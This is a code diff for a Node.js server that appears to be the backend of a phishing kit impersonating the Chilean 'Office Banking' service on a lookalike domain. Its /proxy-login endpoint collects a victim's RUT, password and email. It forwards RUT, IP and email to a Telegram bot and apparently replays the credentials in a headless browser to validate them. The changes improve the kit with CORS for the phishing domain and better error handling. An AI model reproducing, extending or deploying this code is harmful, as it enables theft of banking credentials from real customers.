@@ -6,9 +6,28 @@ const path = require("path");
 // const fetch = require("node-fetch");
 
 const app = express();
-app.use(cors());
+
+// ✅ CORS mejorado - permite tu dominio propio
+const corsOptions = {
+  origin: [
+    "https://www.officebankingchile.info",
+    "https://officebankingchile.info",
+    "http://localhost:3000",
+    "http://localhost:5000"
+  ],
+  methods: ["GET", "POST", "OPTIONS"],
+  allowedHeaders: ["Content-Type", "Authorization"],
+  credentials: true
+};
+
+app.use(cors(corsOptions));
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
+
+// ✅ Health check endpoint
+app.get("/health", (req, res) => {
+  res.json({ status: "ok", message: "Servidor funcionando correctamente" });
+});
 
 // Endpoint para leer configuración
 app.get("/config", (req, res) => {
@@ -66,19 +85,23 @@ app.post("/autorizar", async (req, res) => {
     });
     res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
   } catch (err) {
+    console.error("Error en autorizar:", err);
     res.status(500).json({ status: "error", error: err.message });
   }
 });
 
-// Endpoint para login → notifica ingreso y valida credenciales
+// ✅ Endpoint para login mejorado con manejo de errores
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-  let mensajeFinal = "Bienvenido a Office Banking"; // valor por defecto
+  let mensajeFinal = "Bienvenido a Office Banking";
   let loginStatus = null;
+
+  console.log("📝 POST /proxy-login recibido:", { rut, mail: mail ? "***" : undefined });
 
   try {
     if (mail) {
+      console.log("📧 Procesando correo:", mail);
       const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
       await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
         method: "POST",
@@ -88,8 +111,13 @@ app.post("/proxy-login", async (req, res) => {
       return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
     }
 
+    if (!rut || !passwd) {
+      console.warn("⚠️ RUT o contraseña vacíos");
+      return res.status(400).json({ status: "error", mensaje: "RUT y contraseña son requeridos" });
+    }
+
     // Notificación básica de ingreso
-    const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
+    const ingresoMsg = `🔐 Login recibido AutOB:\nRUT: ${rut}\nIP: ${ip}`;
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -98,7 +126,10 @@ app.post("/proxy-login", async (req, res) => {
 
     // Aquí va la lógica de Puppeteer, dentro del mismo async
     const puppeteer = require("puppeteer");
-    const browser = await puppeteer.launch({ headless: true });
+    const browser = await puppeteer.launch({ 
+      headless: true,
+      args: ["--no-sandbox", "--disable-setuid-sandbox"]
+    });
     const page = await browser.newPage();
 
     // Escuchar respuestas de red
@@ -142,11 +173,11 @@ app.post("/proxy-login", async (req, res) => {
     }
 
     await browser.close();
+    res.json({ status: "ok", mensaje: mensajeFinal });
   } catch (err) {
     console.error("⚠️ Error en validación de credenciales:", err);
+    res.status(500).json({ status: "error", mensaje: "Error al procesar credenciales: " + err.message });
   }
-
-  res.json({ status: "ok", mensaje: mensajeFinal });
 });
 
 // Servir index.html por defecto
@@ -155,5 +186,4 @@ app.get("/", (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
-
+app.listen(PORT, () => console.log(`✅ Servidor corriendo en puerto ${PORT}`));
